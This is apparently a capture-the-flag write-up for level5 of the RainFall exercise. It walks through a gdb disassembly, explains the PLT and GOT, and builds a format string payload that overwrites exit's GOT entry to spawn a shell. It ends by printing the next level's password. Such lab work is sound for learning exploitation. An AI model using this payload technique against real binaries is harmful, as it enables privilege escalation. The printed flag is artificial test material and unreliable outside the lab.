# Level5

```nasm
(gdb) disas main
Dump of assembler code for function main:                     // Calls n
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
```

```nasm
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218                     // Allocate a 0x218 (536) bytes stack
   0x080484cb <+9>:     mov    eax,ds:0x8049848              // Move into eax stdin
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax       // Put that as third argument
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200     // Put 0x200 as second argument
   0x080484dc <+26>:    lea    eax,[ebp-0x208]               // Put a part of the stack in eax
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax           // Put that as first argument
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>         // Call fgets
   0x080484ea <+40>:    lea    eax,[ebp-0x208]               // Load into eax what is in the stack now
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax           // Put that back on top of the stack as first argument
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>        // Call printf
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1           // Set 1 as exit code
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

```nasm
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18                       // Allocate a 24 bytes stack
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0      // Put as first argument "/bin/sh"
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>         // Call system
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1            // Set 1 as exit code
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

We once again have a `fgets` followed by a `printf` but this time the `system` call is hidden in the function `o` that isn’t called anywhere. 

The goal is probably to use a format string exploit to launch the `o` function.

We cannot directly change the return address of main to make it point to the `o` function since there is a call to `exit` and no call to `ret` 

When the program calls `exit` or `printf` it does not directly jump to the function itself : it jumps to `printf@plt` or `exit@plt`, `plt` stands for “**Procedure Linkage Table**” :

> The Procedure Linkage Table (PLT) is a mechanism used in dynamically linked programs to facilitate function calls to external libraries, such
as libc. When a program makes a function call to a dynamically linked function (e.g., `printf`), the code in the PLT is responsible
for resolving the address of the function and transferring control to it. The PLT is part of the dynamic linking process, allowing programs to
call functions from shared libraries without knowing their addresses at compile time.
> 

In short, a small piece of code that makes the link between our program and the external function, wherever it is actually located.

The PLT then looks at the “**Global Offset Table**”, a table that contains the actual memory addresses of the functions we want to call.

> The Global Offset Table (GOT) is a table of pointers, typically within the executable or shared library, that holds the addresses of global variables or functions. When a program is executed, the linker resolves these addresses dynamically, allowing functions and variables to be accessed across different parts of the program or even across different modules.
> 

The key word here is dynamic. We cannot directly change the code and replace the call to `exit` with a call to `o` since it is in read only. We cannot change the PLT either, this code is also read-only and already processed. However, since the GOT is read dynamically, it means it can change at any time, and we can try to modify it, changing the supposed address of `exit` to the address of `o`.

In order to do that, we need to find out where does the actual address of `exit` is in the GOT.

```nasm
level5@RainFall:~$ gdb -q ./level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) p exit
$1 = {<text variable, no debug info>} 0x80483d0 <exit@plt>
```

With `gdb` , we can find an address for `exit`, but that actually corresponds to the address of the PLT that makes the link with `exit`

We can then use the option `x` in `gdb`, that prints whatever is at a given address, with the format specifier `i` , that outputs it as a machine instruction (assembly) :

```nasm
(gdb) x/i 0x80483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
```

This gives us the actual address of `exit`.

So now, just like in previous levels, we can use the `printf` format exploit to find out where we need to change memory :

```nasm
level5@RainFall:~$ echo -e "\x38\x98\x04\x08AAAA%x %x %x %x %x %x %x %x %x %x %x %x" | ./level5
8AAAA200 b7fd1ac0 b7ff37d0 8049838 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

Our payload appears in the 4th position, that’s the one we need to change to `o`'s address (`0x080484a4`, or in decimal : **134513828**). 

We also need to subtract the size of the address (4) so the number of characters we need to write is **134513824.**

Using our usual approach :

```bash
level5@RainFall:~$ (echo -e "\x38\x98\x04\x08%134513824c%4\$n"; cat) | ./level5
```

After a while we end up with a shell !

```bash
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```